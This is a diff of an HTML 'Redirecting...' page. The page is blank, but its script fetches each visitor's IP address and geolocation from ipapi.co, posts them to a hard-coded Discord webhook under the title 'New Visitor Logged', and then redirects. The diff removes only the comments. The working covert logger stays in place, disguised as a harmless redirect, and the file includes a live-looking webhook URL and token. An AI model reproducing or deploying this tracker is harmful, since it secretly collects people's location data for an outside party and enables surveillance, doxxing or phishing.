@@ -4,17 +4,14 @@
     <meta charset="UTF-8">
     <title>Redirecting...</title>
     <script>
-        (async () => {
-            // Set a minimum delay (3 seconds) to ensure data is sent
+        (async () => { 
             const minDelay = 2000; 
             const startTime = Date.now();
 
             try {
-                // Fetch IP & Geolocation
                 const ipResponse = await fetch('https://ipapi.co/json/');
                 const data = await ipResponse.json();
 
-                // Prepare Discord payload
                 const webhookURL = 'https://discord.com/api/webhooks/1400273980522365038/A5LHQj8BQv5mzerr8QpDJ2_iPWInsSLu4meFRf4aA51T4u77LS8awsezamSlfG65H2nw';
                 const embed = {
                     title: "📌 New Visitor Logged",
@@ -28,7 +25,6 @@
                     ]
                 };
 
-                // Send to Discord (wait for completion)
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -41,7 +37,6 @@
                 console.error("Error logging data:", error);
             }
 
-            // Ensure we wait at least 3 seconds before redirecting
             const elapsed = Date.now() - startTime;
             const remainingDelay = Math.max(0, minDelay - elapsed);
             
@@ -53,6 +48,5 @@
     </script>
 </head>
 <body>
-    <!-- Blank page (no visible content) -->
 </body>
 </html>
